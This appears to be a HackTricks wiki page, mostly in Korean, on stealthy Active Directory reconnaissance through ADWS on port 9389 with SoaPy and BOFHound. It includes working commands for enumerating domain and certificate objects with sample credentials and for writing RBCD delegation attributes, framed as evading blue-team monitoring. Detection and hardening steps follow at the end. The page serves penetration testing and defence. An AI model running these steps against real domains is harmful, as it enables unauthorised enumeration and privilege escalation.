# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## What is ADWS?

Active Directory Web Services (ADWS)는 **Windows Server 2008 R2 이후 모든 도메인 컨트롤러에서 기본적으로 활성화되어 있으며** TCP **9389**에서 수신 대기합니다. 이름과는 달리, **HTTP는 포함되지 않습니다**. 대신, 이 서비스는 독점적인 .NET 프레임 프로토콜 스택을 통해 LDAP 스타일의 데이터를 노출합니다:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

트래픽이 이러한 이진 SOAP 프레임 안에 캡슐화되어 있고 일반적이지 않은 포트를 통해 전송되기 때문에, **ADWS를 통한 열거는 고전적인 LDAP/389 및 636 트래픽보다 검사, 필터링 또는 서명될 가능성이 훨씬 적습니다**. 운영자에게는 다음과 같은 의미가 있습니다:

* 더 은밀한 정찰 – 블루 팀은 종종 LDAP 쿼리에 집중합니다.
* SOCKS 프록시를 통해 9389/TCP를 터널링하여 **비 Windows 호스트 (Linux, macOS)**에서 수집할 수 있는 자유.
* LDAP를 통해 얻을 수 있는 동일한 데이터 (사용자, 그룹, ACL, 스키마 등)와 **쓰기**를 수행할 수 있는 능력 (예: **RBCD**를 위한 `msDs-AllowedToActOnBehalfOfOtherIdentity`).

> NOTE: ADWS는 많은 RSAT GUI/PowerShell 도구에서도 사용되므로 트래픽이 합법적인 관리자 활동과 혼합될 수 있습니다.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy)는 **순수 Python으로 ADWS 프로토콜 스택을 완전히 재구현한 것입니다**. 이는 NBFX/NBFSE/NNS/NMF 프레임을 바이트 단위로 생성하여 .NET 런타임에 손대지 않고 Unix 유사 시스템에서 수집할 수 있게 합니다.

### Key Features

* **SOCKS를 통한 프록시 지원** (C2 임플란트에서 유용).
* LDAP `-q '(objectClass=user)'`와 동일한 세밀한 검색 필터.
* 선택적 **쓰기** 작업 ( `--set` / `--delete` ).
* BloodHound에 직접 수집하기 위한 **BOFHound 출력 모드**.
* 사람이 읽기 쉬운 경우를 위해 타임스탬프 / `userAccountControl`을 예쁘게 만드는 `--parse` 플래그.

### Installation (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## Stealth AD Collection Workflow

다음 워크플로우는 ADWS를 통해 **도메인 및 ADCS 객체**를 열거하고, 이를 BloodHound JSON으로 변환한 후 인증서 기반 공격 경로를 탐색하는 방법을 보여줍니다 – 모두 Linux에서:

1. **대상 네트워크에서 귀하의 박스로 9389/TCP 터널링** (예: Chisel, Meterpreter, SSH 동적 포트 포워드 등을 통해). `export HTTPS_PROXY=socks5://127.0.0.1:1080`을 내보내거나 SoaPy의 `--proxyHost/--proxyPort`를 사용하십시오.

2. **루트 도메인 객체 수집:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **구성 NC에서 ADCS 관련 객체 수집:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **BloodHound로 변환:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **ZIP 파일을** BloodHound GUI에 업로드하고 `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c`와 같은 cypher 쿼리를 실행하여 인증서 상승 경로(ESC1, ESC8 등)를 드러냅니다.

### `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD) 작성하기
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
`s4u2proxy`/`Rubeus /getticket`와 결합하여 전체 **리소스 기반 제약 위임** 체인을 만듭니다.

## 탐지 및 강화

### 상세 ADDS 로깅

ADWS(및 LDAP)에서 발생하는 비효율적인 검색을 드러내기 위해 도메인 컨트롤러에서 다음 레지스트리 키를 활성화합니다:
```powershell
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics' -Name '15 Field Engineering' -Value 5 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Expensive Search Results Threshold' -Value 1 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Search Time Threshold (msecs)' -Value 0 -Type DWORD
```
이벤트는 **Directory-Service** 아래에 전체 LDAP 필터와 함께 나타나며, 쿼리가 ADWS를 통해 도착했을 때도 마찬가지입니다.

### SACL 카나리 객체

1. 더미 객체(예: 비활성 사용자 `CanaryUser`)를 생성합니다.
2. _Everyone_ 주체에 대한 **Audit** ACE를 추가하고 **ReadProperty**에서 감사합니다.
3. 공격자가 `(servicePrincipalName=*)`, `(objectClass=user)` 등을 수행할 때마다 DC는 실제 사용자 SID를 포함하는 **Event 4662**를 발생시킵니다. 이는 요청이 프록시되거나 ADWS에서 발생하더라도 마찬가지입니다.

Elastic 사전 구축 규칙 예:
```kql
(event.code:4662 and not user.id:"S-1-5-18") and winlog.event_data.AccessMask:"0x10"
```
## Tooling Summary

| Purpose | Tool | Notes |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | SoaPy/ldapsearch 로그 변환 |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | 동일한 SOCKS를 통해 프록시 가능 |

## References

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)

{{#include ../../banners/hacktricks-training.md}}
